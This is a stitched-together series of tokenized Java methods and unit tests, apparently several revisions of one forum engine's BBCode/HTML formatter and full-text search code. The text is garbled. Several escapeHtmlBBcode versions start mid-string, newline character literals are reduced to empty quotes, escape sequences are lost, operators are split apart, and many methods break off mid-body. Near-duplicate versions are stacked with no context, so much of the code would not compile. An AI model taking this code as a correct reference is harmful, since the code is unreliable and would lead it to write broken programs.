public void testUnexceptedCut ( ) throws BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . setIncludeCut ( true ) ; String result = proc . preparePostText ( null , " [list][*][cut][/cut][/list] " ) ; assertEquals ( " <p><ul><li></ul><p> " , result ) ; } 
public void testBBinListType ( ) throws SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . setIncludeCut ( false ) ; String result = proc . preparePostText ( null , " [b][list= \" [/b] \" ][/list] " ) ; assertEquals ( " <p>[b]<ol type= \" &#91;/b&#93; \" ></ol><p> " , result ) ; } 
public ModelAndView showUserTopics ( @RequestParam ( " nick " ) String nick , @RequestParam ( value = " offset " , required = false ) Integer offset , @RequestParam ( value = " output " , required = false ) String output , HttpServletResponse response ) throws Exception { Connection db = null ; Map < String , Object > params = new HashMap < String , Object > ( ) ; try { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 60 * 1000 ) ; 
public void write ( OutputStream df ) throws IOException { profileHashtable . setObject ( SYSTEM_TIMESTAMP , new Date ( ) . getTime ( ) ) ; ObjectOutputStream dof = null ; try { dof = new ObjectOutputStream ( df ) ; 
public String process ( ) { StringTokenizer st = new StringTokenizer ( htmlSpecialChars ( text ) , " " , true ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( formatHTMLLine ( st . nextToken ( ) ) ) ; } String res = sb . toString ( ) ; if ( NewLine ) { res = nl2br ( res , quoting ) ; } if ( texNewLine ) { res = texnl2br ( res , quoting ) ; } return res ; } 
public static String escapeHtmlBBcode ( String content ) { ".toCharArray(), new String[]{ : "&#58;", "&#91;", "&#93;", "&lt;", "&gt;", "&#40;", "&#41;", "&#123;", "&#125;", "&nbsp; &nbsp;"}); return content; } 
public String process ( ) { String str ; if ( outputLorcode ) { str = CodeTag . escapeHtmlBBcode ( text ) ; } else { str = htmlSpecialChars ( text ) ; } StringTokenizer st = new StringTokenizer ( str , " " , true ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( formatHTMLLine ( st . nextToken ( ) ) ) ; } String res = sb . toString ( ) ; if ( newLine ) { res = nl2br ( res , quoting ) ; } if ( texNewLine ) { res = texnl2br ( res , quoting , outputLorcode ) ; } return res ; } 
public void enableNewLineMode ( ) { newLine = true ; texNewLine = false ; } 
public void enableTexNewLineMode ( ) { newLine = false ; texNewLine = true ; } 
static String texnl2br ( String text , boolean quoting , boolean outputLorcode ) { if ( ! quoting ) { if ( outputLorcode ) { return text ; } return text . replaceAll ( texnlRE . pattern ( ) , " <p> " ) ; } StringBuilder buf = new StringBuilder ( ) ; boolean cr = false ; boolean quot = false ; for ( int i = 0 ; i < text . length ( ) ; i + + ) { if ( text . charAt ( i ) = = '\r' ) { continue ; } if ( text . charAt ( i ) = = '' | | i = = 0 ) { if ( cr | | i = = 0 ) { if ( quot ) { quot = false ; if ( outputLorcode ) { buf . append ( " [/i] " ) ; } else { buf . append ( " </i> " ) ; } } if ( i ! = 0 & & ! outputLorcode ) { buf . append ( " <p> " ) ; } if ( text . substring ( i ) . trim ( ) . startsWith ( " &gt; " ) ) { quot = true ; if ( outputLorcode ) { buf . append ( " [i]> " ) ; i + = 4 ; } else { buf . append ( " <i> " ) ; } } } else { cr = true ; } } else { cr = false ; } buf . append ( text . charAt ( i ) ) ; } if ( quot ) { if ( outputLorcode ) { buf . append ( " [/i] " ) ; } else { buf . append ( " </i> " ) ; } } return buf . toString ( ) ; } 
public void testParaSubstition ( ) { String str = " this is a line r rwith some nlinebreaks in it " ; String s = HTMLFormatter . texnl2br ( str , false , false ) ; Integer i = s . indexOf ( " <p> " ) ; assertThat ( " Newlines is changed to <p> " , i , CoreMatchers . not ( - 1 ) ) ; Integer b = s . indexOf ( " <p> " , i + 3 ) ; assertThat ( " Wait, there should be two paras " , b , CoreMatchers . not ( - 1 ) ) ; } 
public void testBBCode1 ( ) { HTMLFormatter f = new HTMLFormatter ( " test ntest ntest " ) ; f . setOutputLorcode ( true ) ; f . enableQuoting ( ) ; f . enableTexNewLineMode ( ) ; assertEquals ( " test ntest ntest " , f . process ( ) ) ; } 
public void testBBCode2 ( ) { HTMLFormatter f = new HTMLFormatter ( " www.linux.org.ru " ) ; f . setOutputLorcode ( true ) ; f . enableQuoting ( ) ; f . enableUrlHighLightMode ( ) ; assertEquals ( " [url=http:www.linux.org.ru]www.linux.org.ru[/url] " , f . process ( ) ) ; } 
public void testBBCode3 ( ) { HTMLFormatter f = new HTMLFormatter ( " http:www.linux.org.ru/ " ) ; f . setOutputLorcode ( true ) ; f . enableQuoting ( ) ; f . enableUrlHighLightMode ( ) ; assertEquals ( " [url=http:www.linux.org.ru/]http:www.linux.org.ru/[/url] " , f . process ( ) ) ; } 
public void testBBCode4 ( ) { HTMLFormatter f = new HTMLFormatter ( " >test ntest " ) ; f . setOutputLorcode ( true ) ; f . enableQuoting ( ) ; f . enableUrlHighLightMode ( ) ; f . enableTexNewLineMode ( ) ; assertEquals ( " [i]>test n[/i] ntest " , f . process ( ) ) ; } 
private String processMessage ( String msg , String mode ) { if ( " lorcode " . equals ( mode ) ) { return msg ; } HTMLFormatter form = new HTMLFormatter ( msg ) ; form . setMaxLength ( 80 ) ; form . enableUrlHighLightMode ( ) ; if ( " ntobrq " . equals ( mode ) ) { form . enableNewLineMode ( ) ; form . enableQuoting ( ) ; } if ( " ntobr " . equals ( mode ) ) { form . enableNewLineMode ( ) ; } if ( " tex " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; } if ( " quot " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; form . enableQuoting ( ) ; form . setOutputLorcode ( true ) ; } return form . process ( ) ; } 
public static String replaceAll ( CharSequence str , char [ ] chars , String [ ] replacement ) { StringBuilder buffer = new StringBuilder ( ) ; for ( int i = 0 ; i < str . length ( ) ; i + + ) { char c = str . charAt ( i ) ; boolean matched = false ; for ( int j = 0 ; j < chars . length ; j + + ) { if ( c = = chars [ j ] ) { buffer . append ( replacement [ j ] ) ; matched = true ; } } if ( ! matched ) { buffer . append ( c ) ; } } return buffer . toString ( ) ; } 
public String process ( ) { String str ; if ( outputLorcode ) { str = escapeHtmlBBcode ( text ) ; } else { str = htmlSpecialChars ( text ) ; } StringTokenizer st = new StringTokenizer ( str , " " , true ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( formatHTMLLine ( st . nextToken ( ) ) ) ; } String res = sb . toString ( ) ; if ( newLine ) { res = nl2br ( res , quoting ) ; } if ( texNewLine ) { res = texnl2br ( res , quoting , outputLorcode ) ; } return res ; } 
static String texnl2br ( String text , boolean quoting , boolean outputLorcode ) { if ( ! quoting ) { if ( outputLorcode ) { return text ; } return text . replaceAll ( texnlRE . pattern ( ) , " <p> " ) ; } StringBuilder buf = new StringBuilder ( ) ; boolean cr = false ; boolean quot = false ; for ( int i = 0 ; i < text . length ( ) ; i + + ) { if ( text . charAt ( i ) = = '\r' ) { continue ; } if ( text . charAt ( i ) = = '' | | i = = 0 ) { if ( cr | | i = = 0 ) { if ( quot ) { quot = false ; if ( outputLorcode ) { buf . append ( " [/i] " ) ; } else { buf . append ( " </i> " ) ; } } if ( i ! = 0 & & ! outputLorcode ) { buf . append ( " <p> " ) ; } if ( outputLorcode ) { if ( text . substring ( i ) . trim ( ) . startsWith ( " > " ) ) { quot = true ; buf . append ( " [i] " ) ; } } else { if ( text . substring ( i ) . trim ( ) . startsWith ( " &gt; " ) ) { quot = true ; buf . append ( " <i> " ) ; } } } else { cr = true ; } } else { cr = false ; } buf . append ( text . charAt ( i ) ) ; } if ( quot ) { if ( outputLorcode ) { buf . append ( " [/i] " ) ; } else { buf . append ( " </i> " ) ; } } return buf . toString ( ) ; } 
public static String escapeHtmlBBcode ( String content ) { ".toCharArray(), new String[]{ "&#91;", "&#93;", "&#40;", "&#41;", "&#123;", "&#125;", "&nbsp; &nbsp;"}); return content; } 
public void testBBCode5 ( ) { HTMLFormatter f = new HTMLFormatter ( " <> " ) ; f . setOutputLorcode ( true ) ; f . enableQuoting ( ) ; f . enableUrlHighLightMode ( ) ; f . enableTexNewLineMode ( ) ; assertEquals ( " <> " , f . process ( ) ) ; } 
public void testBBCode6 ( ) { HTMLFormatter f = new HTMLFormatter ( " test http:www.linux.org.ru/jump-message.jsp?msgid=4238459&cid=4240245 test " ) ; f . setOutputLorcode ( true ) ; f . enableQuoting ( ) ; f . enableUrlHighLightMode ( ) ; f . enableTexNewLineMode ( ) ; assertEquals ( " test [url=http:www.linux.org.ru/jump-message.jsp?msgid=4238459&cid=4240245]http:www.linux.org.ru/jump-message.jsp?msgid=4238459&cid=4240245[/url] test " , f . process ( ) ) ; } 
static String texnl2br ( String text , boolean quoting , boolean outputLorcode ) { if ( ! quoting ) { if ( outputLorcode ) { return text ; } return text . replaceAll ( texnlRE . pattern ( ) , " <p> " ) ; } StringBuilder buf = new StringBuilder ( ) ; boolean cr = false ; boolean quot = false ; for ( int i = 0 ; i < text . length ( ) ; i + + ) { if ( text . charAt ( i ) = = '\r' ) { continue ; } if ( text . charAt ( i ) = = '' | | i = = 0 ) { if ( cr | | i = = 0 ) { if ( quot ) { quot = false ; if ( outputLorcode ) { buf . append ( " [/i] " ) ; } else { buf . append ( " </i> " ) ; } } if ( i ! = 0 & & ! outputLorcode ) { buf . append ( " <p> " ) ; } if ( outputLorcode ) { if ( text . substring ( i ) . trim ( ) . startsWith ( " > " ) ) { quot = true ; buf . append ( " n[i] " ) ; } } else { if ( text . substring ( i ) . trim ( ) . startsWith ( " &gt; " ) ) { quot = true ; buf . append ( " <i> " ) ; } } } else { cr = true ; } } else { cr = false ; } buf . append ( text . charAt ( i ) ) ; } if ( quot ) { if ( outputLorcode ) { buf . append ( " [/i] " ) ; } else { buf . append ( " </i> " ) ; } } return buf . toString ( ) ; } 
public void testBBCode4 ( ) { HTMLFormatter f = new HTMLFormatter ( " >test ntest " ) ; f . setOutputLorcode ( true ) ; f . enableQuoting ( ) ; f . enableUrlHighLightMode ( ) ; f . enableTexNewLineMode ( ) ; assertEquals ( " n[i]>test n[/i] ntest " , f . process ( ) ) ; } 
public void testBBCode7 ( ) { HTMLFormatter f = new HTMLFormatter ( " test n>test " ) ; f . setOutputLorcode ( true ) ; f . enableQuoting ( ) ; f . enableUrlHighLightMode ( ) ; f . enableTexNewLineMode ( ) ; assertEquals ( " test n[i] n>test[/i] " , f . process ( ) ) ; } 
public void testBBCode8 ( ) { HTMLFormatter f = new HTMLFormatter ( " test & " ) ; f . setOutputLorcode ( true ) ; f . enableQuoting ( ) ; f . enableUrlHighLightMode ( ) ; f . enableTexNewLineMode ( ) ; assertEquals ( " test & " , f . process ( ) ) ; } 
private String processMessage ( String msg , String mode ) { if ( " lorcode " . equals ( mode ) ) { return msg ; } HTMLFormatter form = new HTMLFormatter ( msg ) ; form . setMaxLength ( 80 ) ; form . enableUrlHighLightMode ( ) ; if ( " ntobrq " . equals ( mode ) ) { form . enableNewLineMode ( ) ; form . enableQuoting ( ) ; } if ( " ntobr " . equals ( mode ) ) { form . enableNewLineMode ( ) ; } if ( " tex " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; form . setOutputLorcode ( true ) ; } if ( " quot " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; form . enableQuoting ( ) ; form . setOutputLorcode ( true ) ; } return form . process ( ) ; } 
public void testBr ( ) throws SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . setIncludeCut ( false ) ; String result = proc . preparePostText ( null , " test[br]test " ) ; assertEquals ( " <p>test<br>test " , result ) ; } 
private String processMessage ( String msg , String mode ) { if ( " lorcode " . equals ( mode ) ) { return msg ; } HTMLFormatter form = new HTMLFormatter ( msg ) ; form . setMaxLength ( 80 ) ; form . enableUrlHighLightMode ( ) ; if ( " ntobrq " . equals ( mode ) ) { form . enableNewLineMode ( ) ; form . enableQuoting ( ) ; } if ( " ntobr " . equals ( mode ) ) { form . enableNewLineMode ( ) ; form . setOutputLorcode ( true ) ; } if ( " tex " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; form . setOutputLorcode ( true ) ; } if ( " quot " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; form . enableQuoting ( ) ; form . setOutputLorcode ( true ) ; } return form . process ( ) ; } 
public String process ( ) { String str ; if ( outputLorcode ) { str = escapeHtmlBBcode ( text ) ; } else { str = htmlSpecialChars ( text ) ; } StringTokenizer st = new StringTokenizer ( str , " " , true ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( formatHTMLLine ( st . nextToken ( ) ) ) ; } String res = sb . toString ( ) ; if ( newLine ) { res = nl2br ( res , quoting , outputLorcode ) ; } if ( texNewLine ) { res = texnl2br ( res , quoting , outputLorcode ) ; } return res ; } 
public static String nl2br ( String text ) { return nl2br ( text , false , false ) ; } 
static String nl2br ( String text , boolean quoting , boolean outputLorcode ) { if ( ! quoting ) { if ( outputLorcode ) { return text . replaceAll ( nlRE . pattern ( ) , " [br] " ) ; } else { return text . replaceAll ( nlRE . pattern ( ) , " <br> " ) ; } } StringBuilder buf = new StringBuilder ( ) ; boolean quot = false ; for ( int i = 0 ; i < text . length ( ) ; i + + ) { if ( text . charAt ( i ) = = '\r' ) { continue ; } if ( text . charAt ( i ) = = '' | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " </i> " ) ; } if ( text . substring ( i ) . trim ( ) . startsWith ( " &gt; " ) ) { quot = true ; buf . append ( " <i> " ) ; } if ( text . charAt ( i ) = = '' ) { buf . append ( " <br> " ) ; } } buf . append ( text . charAt ( i ) ) ; } if ( quot ) { buf . append ( " </i> " ) ; } return buf . toString ( ) ; } 
public void testBBCode9 ( ) { HTMLFormatter f = new HTMLFormatter ( " test r ntest " ) ; f . setOutputLorcode ( true ) ; f . enableUrlHighLightMode ( ) ; f . enableNewLineMode ( ) ; assertEquals ( " test[br] ntest " , f . process ( ) ) ; } 
public void addSection ( int section ) { sections . add ( section ) ; } 
public String show ( Connection db ) throws SQLException , UtilException , UserErrorException { StringBuilder select = new StringBuilder ( " " + " SELECT " + " msgs.id, title, postdate, topic, userid, rank(idxFTI, q) as rank, message, bbcode " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; select . append ( " AND msgbase_postdate>'now'::timestamp-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; select . append ( " AND msgbase_postdate>'now'::timestamp-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; } if ( username . length ( ) > 0 ) { try { User user = User . getUser ( db , username ) ; select . append ( " AND userid= " ) . append ( user . getId ( ) ) ; } catch ( UserNotFoundException ex ) { throw new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = null ; try { pst = db . prepareStatement ( select . toString ( ) ) ; 
public String show ( Connection db ) throws SQLException , UtilException , UserErrorException { StringBuilder select = new StringBuilder ( " " + " SELECT " + " msgs.id, msgs.title, msgs.postdate, topic, msgs.userid, rank(idxFTI, q) as rank, message, bbcode " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } if ( section ! = 0 ) { select . append ( " , topics, groups " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND msgs.postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND msgs.postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; select . append ( " AND topics.id = topic AND groups.id = topics.groupid " ) ; } if ( username . length ( ) > 0 ) { try { User user = User . getUser ( db , username ) ; select . append ( " AND userid= " ) . append ( user . getId ( ) ) ; } catch ( UserNotFoundException ex ) { throw new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = null ; try { pst = db . prepareStatement ( select . toString ( ) ) ; 
public String show ( Connection db ) throws SQLException , UtilException , UserErrorException { StringBuilder select = new StringBuilder ( " " + " SELECT " + " msgs.id, msgs.title, msgs.postdate, topic, msgs.userid, rank(idxFTI, q) as rank, message, bbcode " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } if ( section ! = 0 ) { select . append ( " , topics, groups " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND msgs.postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND msgs.postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; select . append ( " AND topics.id = topic AND groups.id = topics.groupid " ) ; } if ( username . length ( ) > 0 ) { try { User user = User . getUser ( db , username ) ; select . append ( " AND msgs.userid= " ) . append ( user . getId ( ) ) ; } catch ( UserNotFoundException ex ) { throw new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = null ; try { pst = db . prepareStatement ( select . toString ( ) ) ; 
public String show ( Connection db ) throws SQLException , UserErrorException { StringBuilder select = new StringBuilder ( " " + " SELECT " + " msgs.id, msgs.title, msgs.postdate, topic, msgs.userid, rank(idxFTI, q) as rank, message, bbcode " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } if ( section ! = 0 ) { select . append ( " , topics, groups " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND msgs.postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND msgs.postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; select . append ( " AND topics.id = topic AND groups.id = topics.groupid " ) ; } if ( username . length ( ) > 0 ) { try { User user = User . getUser ( db , username ) ; select . append ( " AND msgs.userid= " ) . append ( user . getId ( ) ) ; } catch ( UserNotFoundException ex ) { throw new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = null ; try { pst = db . prepareStatement ( select . toString ( ) ) ; 
public static int parseInclude ( String include ) { if ( include = = null ) { return SEARCH_ALL ; } if ( " topics " . equals ( include ) ) { return SEARCH_TOPICS ; } return SEARCH_ALL ; } 
public static int parseDate ( String date ) { if ( date = = null ) { return SEARCH_YEAR ; } if ( " 3month " . equals ( date ) ) { return SEARCH_3MONTH ; } if ( " all " . equals ( date ) ) { return SEARCH_ALL ; } return SEARCH_YEAR ; } 
public static String getViewer ( SearchViewer viewer , boolean nocache ) throws SQLException , UserErrorException { return new ViewerCacher ( ) . get ( viewer , nocache ) ; } 
public String get ( SearchViewer viewer , boolean nocache ) throws SQLException , UserErrorException { MemCachedClient mcc = MemCachedSettings . getClient ( ) ; String cacheId = MemCachedSettings . getId ( viewer . getVariantID ( ) ) ; String res = null ; if ( ! nocache ) { time = 0 ; long current = new Date ( ) . getTime ( ) ; res = ( String ) mcc . get ( cacheId ) ; time = new Date ( ) . getTime ( ) - current ; fromCache = true ; } if ( res = = null ) { Connection db = null ; try { long current = new Date ( ) . getTime ( ) ; db = LorDataSource . getConnection ( ) ; res = viewer . show ( db ) ; time = new Date ( ) . getTime ( ) - current ; fromCache = false ; } finally { if ( db ! = null ) { db . close ( ) ; } } mcc . add ( cacheId , res , viewer . getExpire ( ) ) ; } return res ; } 
private String processMessage ( String msg , String mode ) { if ( " lorcode " . equals ( mode ) ) { return msg ; } HTMLFormatter form = new HTMLFormatter ( msg ) ; form . setMaxLength ( 80 ) ; form . enableUrlHighLightMode ( ) ; form . setOutputLorcode ( true ) ; if ( " ntobrq " . equals ( mode ) ) { form . enableNewLineMode ( ) ; form . enableQuoting ( ) ; } if ( " ntobr " . equals ( mode ) ) { form . enableNewLineMode ( ) ; } if ( " tex " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; } if ( " quot " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; form . enableQuoting ( ) ; } return form . process ( ) ; } 
static String nl2br ( String text , boolean quoting , boolean outputLorcode ) { if ( ! quoting ) { if ( outputLorcode ) { return text . replaceAll ( nlRE . pattern ( ) , " [br] " ) ; } else { return text . replaceAll ( nlRE . pattern ( ) , " <br> " ) ; } } StringBuilder buf = new StringBuilder ( ) ; boolean quot = false ; for ( int i = 0 ; i < text . length ( ) ; i + + ) { if ( text . charAt ( i ) = = '\r' ) { continue ; } if ( text . charAt ( i ) = = '' | | i = = 0 ) { if ( quot ) { quot = false ; if ( outputLorcode ) { buf . append ( " [/i] " ) ; } else { buf . append ( " </i> " ) ; } } if ( outputLorcode ) { if ( text . substring ( i ) . trim ( ) . startsWith ( " > " ) ) { quot = true ; buf . append ( " [i] " ) ; } } else { if ( text . substring ( i ) . trim ( ) . startsWith ( " &gt; " ) ) { quot = true ; buf . append ( " <i> " ) ; } } if ( text . charAt ( i ) = = '' ) { if ( outputLorcode ) { buf . append ( " [br] " ) ; } else { buf . append ( " <br> " ) ; } } } buf . append ( text . charAt ( i ) ) ; } if ( quot ) { buf . append ( " </i> " ) ; } return buf . toString ( ) ; } 
public void testBBCode10 ( ) { HTMLFormatter f = new HTMLFormatter ( " test ntest " ) ; f . setOutputLorcode ( true ) ; f . enableNewLineMode ( ) ; f . enableUrlHighLightMode ( ) ; f . enableQuoting ( ) ; assertEquals ( " test[br] ntest " , f . process ( ) ) ; } 
public void testBBCode11 ( ) { HTMLFormatter f = new HTMLFormatter ( " >test ntest " ) ; f . setOutputLorcode ( true ) ; f . enableNewLineMode ( ) ; f . enableUrlHighLightMode ( ) ; f . enableQuoting ( ) ; assertEquals ( " [i]>test[/i][br] ntest " , f . process ( ) ) ; } 
private static int allocateMsgid ( Connection db ) throws SQLException { Statement st = null ; ResultSet rs = null ; try { st = db . createStatement ( ) ; 
public ModelAndView search ( @RequestParam ( value = " q " , required = false ) String q , @RequestParam ( value = " include " , required = false ) String includeString , @RequestParam ( value = " date " , required = false ) String dateString , @RequestParam ( value = " section " , required = false ) Integer section , @RequestParam ( value = " sort " , required = false ) Integer sort , @RequestParam ( value = " username " , required = false ) String username ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; boolean initial = q = = null ; params . put ( " initial " , initial ) ; if ( q = = null ) { q = " " ; } params . put ( " q " , q ) ; int include = parseInclude ( includeString ) ; params . put ( " include " , include ) ; int date = parseDate ( dateString ) ; params . put ( " date " , date ) ; if ( section = = null ) { section = 0 ; } params . put ( " section " , section ) ; if ( sort = = null ) { sort = SearchViewer . SORT_R ; } params . put ( " sort " , sort ) ; if ( username = = null ) { username = " " ; } params . put ( " username " , username ) ; if ( ! initial ) { SearchViewer sv = new SearchViewer ( q ) ; sv . setDate ( date ) ; sv . setInclude ( include ) ; sv . setSection ( section ) ; sv . setSort ( sort ) ; sv . setUser ( username ) ; ViewerCacher cacher = new ViewerCacher ( ) ; params . put ( " result " , cacher . get ( sv , false ) ) ; params . put ( " cached " , cacher . isFromCache ( ) ) ; params . put ( " time " , cacher . getTime ( ) ) ; } return new ModelAndView ( " search " , params ) ; } 
public static int parseInclude ( String include ) { if ( include = = null ) { return SearchViewer . SEARCH_ALL ; } if ( " topics " . equals ( include ) ) { return SearchViewer . SEARCH_TOPICS ; } return SearchViewer . SEARCH_ALL ; } 
public static int parseDate ( String date ) { if ( date = = null ) { return SearchViewer . SEARCH_YEAR ; } if ( " 3month " . equals ( date ) ) { return SearchViewer . SEARCH_3MONTH ; } if ( " all " . equals ( date ) ) { return SearchViewer . SEARCH_ALL ; } return SearchViewer . SEARCH_YEAR ; } 
public static Set < Integer > makeHideSet ( Connection db , CommentList comments , int filterChain , Map < Integer , String > ignoreList ) throws SQLException , UserNotFoundException { if ( filterChain = = CommentFilter . FILTER_NONE ) { return null ; } Set < Integer > hideSet = new HashSet < Integer > ( ) ; if ( ( filterChain & CommentFilter . FILTER_IGNORED ) > 0 ) { if ( ignoreList ! = null & & ! ignoreList . isEmpty ( ) ) { comments . root . hideIgnored ( hideSet , ignoreList ) ; } } return hideSet ; } 
public static Map < Integer , String > getIgnoreList ( Connection db , String nick ) throws SQLException { PreparedStatement pst = db . prepareStatement ( " SELECT a.ignored,b.nick FROM ignore_list a, users b WHERE a.userid=(SELECT id FROM users WHERE nick=?) AND b.id=a.ignored " ) ; pst . clearParameters ( ) ; pst . setString ( 1 , nick ) ; ResultSet rs = pst . executeQuery ( ) ; Map < Integer , String > cignored = new HashMap < Integer , String > ( ) ; while ( rs . next ( ) ) { cignored . put ( rs . getInt ( " ignored " ) , rs . getString ( " nick " ) ) ; } return cignored ; } 
static String nl2br ( String text , boolean quoting , boolean outputLorcode ) { if ( ! quoting ) { if ( outputLorcode ) { return text . replaceAll ( nlRE . pattern ( ) , " [br] " ) ; } else { return text . replaceAll ( nlRE . pattern ( ) , " <br> " ) ; } } StringBuilder buf = new StringBuilder ( ) ; boolean quot = false ; for ( int i = 0 ; i < text . length ( ) ; i + + ) { if ( text . charAt ( i ) = = '\r' ) { continue ; } if ( text . charAt ( i ) = = '' | | i = = 0 ) { if ( quot ) { quot = false ; if ( outputLorcode ) { buf . append ( " [/i] " ) ; } else { buf . append ( " </i> " ) ; } } if ( outputLorcode ) { if ( text . substring ( i ) . trim ( ) . startsWith ( " > " ) ) { quot = true ; buf . append ( " [i] " ) ; } } else { if ( text . substring ( i ) . trim ( ) . startsWith ( " &gt; " ) ) { quot = true ; buf . append ( " <i> " ) ; } } if ( text . charAt ( i ) = = '' ) { if ( outputLorcode ) { buf . append ( " [br] " ) ; } else { buf . append ( " <br> " ) ; } } } buf . append ( text . charAt ( i ) ) ; } if ( quot ) { if ( outputLorcode ) { buf . append ( " [/i] " ) ; } else { buf . append ( " </i> " ) ; } } return buf . toString ( ) ; } 
public void testBBCode12 ( ) { HTMLFormatter f = new HTMLFormatter ( " >test n>test " ) ; f . setOutputLorcode ( true ) ; f . enableNewLineMode ( ) ; f . enableUrlHighLightMode ( ) ; f . enableQuoting ( ) ; assertEquals ( " [i]>test[/i][i][br] " + " >test[/i] " , f . process ( ) ) ; 
public void testCodeExcape ( ) throws BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , " [code] \" code&code \" [/code] " ) ; assertEquals ( " <p><div class=code><pre class= \" brush: plain; wrap-lines: false \" >&quot;code&amp;code&quot;</pre></div><p> " , result ) ; } 
public void testCodeBR ( ) throws SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . setIncludeCut ( false ) ; String result = proc . preparePostText ( null , " [code]test ntest[/code] " ) ; assertEquals ( " <p><div class=code><pre class= \" brush: plain; wrap-lines: false \" >test n ntest</pre></div><p> " , result ) ; } 
public static String escapeHtmlBBcode ( String content ) { ".toCharArray(), new String[]{ : "&#58;", "&#91;", "&#93;", "&lt;", "&gt;", "&#40;", "&#41;", "&#123;", "&#125;", "&nbsp; &nbsp;", " "}); return content; } 
public static String escapeHtmlBBcode ( String content ) { \r".toCharArray(), new String[]{ : "&#58;", "&#91;", "&#93;", "&lt;", "&gt;", "&#40;", "&#41;", "&#123;", "&#125;", "&nbsp; &nbsp;", " ", ""}); return content; } 
